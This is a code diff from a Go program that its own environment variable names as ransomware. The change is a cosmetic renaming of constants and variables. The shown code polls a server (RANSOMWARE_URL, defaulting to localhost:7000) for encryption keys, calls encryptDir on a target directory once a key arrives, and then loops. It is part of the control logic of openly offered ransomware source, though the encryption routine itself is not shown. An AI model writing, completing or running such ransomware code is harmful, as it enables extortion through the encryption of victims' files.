@@ -31,8 +31,8 @@ import (
 )
 
 const (
-	SECONDS_TO_WAIT_WHEN_CONNECTION_FAILED  = 5
-	SECONDS_TO_WAIT_WHEN_CONNECTION_SUCCESS = 15
+	secondsToWaitWhenConnectionFailed  = 5
+	secondsToWaitWhenConnectionSuccess = 15
 )
 
 var (
@@ -42,18 +42,18 @@ var (
 )
 
 func start(channel chan cryptography.ServerConfig) {
-	serverUrl := os.Getenv("RANSOMWARE_URL")
-	if serverUrl == "" {
-		serverUrl = "http://localhost:7000"
+	serverURL := os.Getenv("RANSOMWARE_URL")
+	if serverURL == "" {
+		serverURL = "http://localhost:7000"
 	}
 	for {
-		config := util.GetServerConfig(channel, serverUrl)
+		config := util.GetServerConfig(channel, serverURL)
 		if hasPubKeyIn(config) || hasPrivKeyIn(config) {
 			channel <- config
 			go encryptOrDecrypt(channel)
 			break
 		} else {
-			wait(SECONDS_TO_WAIT_WHEN_CONNECTION_FAILED)
+			wait(secondsToWaitWhenConnectionFailed)
 		}
 	}
 }
@@ -79,7 +79,7 @@ func encryptOrDecrypt(channel chan cryptography.ServerConfig) {
 		encryptDir(targetDir, config)
 		encrypted = true
 	}
-	wait(SECONDS_TO_WAIT_WHEN_CONNECTION_SUCCESS)
+	wait(secondsToWaitWhenConnectionSuccess)
 	go start(channel)
 }
 
